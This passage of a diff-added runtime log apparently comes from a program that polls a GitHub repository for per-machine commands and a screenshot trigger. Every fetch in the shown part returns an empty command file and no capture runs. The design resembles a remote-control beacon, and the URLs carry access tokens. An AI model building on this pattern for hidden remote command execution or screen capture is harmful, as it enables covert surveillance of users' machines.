OMPUTERS/commands.txt"}}
+[2026-08-04 03:04:15.071] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:15.071] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:15.072] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:04:16.073] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:04:16.459] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:16.460] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFXX2TKIWKGJNFAMFKLKOEIJZAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:16.461] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:16.462] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:16.463] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:04:18.465] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:04:18.838] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:18.839] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFVRUGZKO7NQE42UFETKOEIJ7AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:18.840] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:18.840] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:18.841] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:04:21.843] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:04:22.276] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:22.277] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFVQAD7ERQZAMTYS5ATKOEIKFAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:22.278] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:22.279] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:22.279] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:04:22.280] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:04:22.281] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:04:22.282] Processing screenshot config...
+[2026-08-04 03:04:22.282] [TRACE] handle_capture_settings: start
+[2026-08-04 03:04:22.283] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:04:22.817] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:04:22.818] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:04:22.818] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:04:22.819] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:04:22.820] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:04:22.821] Sleeping for 10 seconds...
+[2026-08-04 03:04:32.824] [TRACE] main loop: iteration start
+[2026-08-04 03:04:32.825] 
+--- POLL ITERATION START ---
+[2026-08-04 03:04:32.826] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:04:33.366] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:04:33.747] screenshots/config.json already exists
+[2026-08-04 03:04:34.749] Fetching path list from GitHub...
+[2026-08-04 03:04:34.750] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:04:34.751] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:04:35.274] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:35.275] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFQASZMVDU47YMUCMD3KOEIK7AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:35.276] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:35.276] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:35.277] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:04:36.278] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:04:36.646] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:36.647] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFVH7IC47CRWRMH3MRLKOEILDAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:36.648] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:36.649] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:36.649] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:04:38.651] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:04:39.015] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:39.016] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFRAPPQ6422YVFUSE3LKOEILHAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:39.016] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:39.017] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:39.017] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:04:42.019] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:04:42.393] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:42.393] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFQXKYLD226YUZB3Z4TKOEILNAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:42.394] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:42.395] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:42.396] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:04:42.397] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:04:42.399] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:04:42.400] Processing screenshot config...
+[2026-08-04 03:04:42.400] [TRACE] handle_capture_settings: start
+[2026-08-04 03:04:42.401] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:04:42.961] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:04:42.962] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:04:42.963] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:04:42.964] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:04:42.964] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:04:42.966] Sleeping for 10 seconds...
+[2026-08-04 03:04:52.969] [TRACE] main loop: iteration start
+[2026-08-04 03:04:52.970] 
+--- POLL ITERATION START ---
+[2026-08-04 03:04:52.971] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:04:53.487] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:04:53.856] screenshots/config.json already exists
+[2026-08-04 03:04:54.858] Fetching path list from GitHub...
+[2026-08-04 03:04:54.859] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:04:54.859] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:04:55.387] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:55.388] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFTY6L6B3B5TNJGPKXDKOEIMHAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:55.389] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:55.390] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:55.390] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:04:56.392] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:04:56.809] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:56.810] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFR3GIYGVZRR2UYXHKTKOEIMLAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:56.812] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:56.812] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:56.813] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:04:58.815] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:04:59.191] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:59.191] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFXMPXYWVJ7Z4WXFUVLKOEIMPAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:59.192] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:59.193] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:59.193] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:05:02.195] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:05:02.562] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:02.562] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFXXOYEYGLJKMJWOMOTKOEIMVAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:02.563] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:02.564] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:02.565] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:05:02.565] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:05:02.567] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:05:02.568] Processing screenshot config...
+[2026-08-04 03:05:02.569] [TRACE] handle_capture_settings: start
+[2026-08-04 03:05:02.570] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:05:03.128] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:05:03.129] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:05:03.129] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:05:03.130] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:05:03.131] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:05:03.132] Sleeping for 10 seconds...
+[2026-08-04 03:05:13.135] [TRACE] main loop: iteration start
+[2026-08-04 03:05:13.137] 
+--- POLL ITERATION START ---
+[2026-08-04 03:05:13.138] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:05:13.700] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:05:14.078] screenshots/config.json already exists
+[2026-08-04 03:05:15.080] Fetching path list from GitHub...
+[2026-08-04 03:05:15.082] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:05:15.083] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:05:15.650] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:15.651] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFU3U3GKYLWMB5THVFTKOEINRAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:15.652] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:15.653] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:15.653] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:05:16.655] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:05:17.036] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:17.038] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFWQFUSUM5D2HHF4UZDKOEINTAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:17.039] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:17.039] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:17.040] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:05:19.041] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:05:19.421] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:19.422] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFSTO735QAIHKMY7NFLKOEINXAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:19.422] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:19.423] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:19.424] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:05:22.425] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:05:22.825] [COMMANDS] Response status: 200 OK
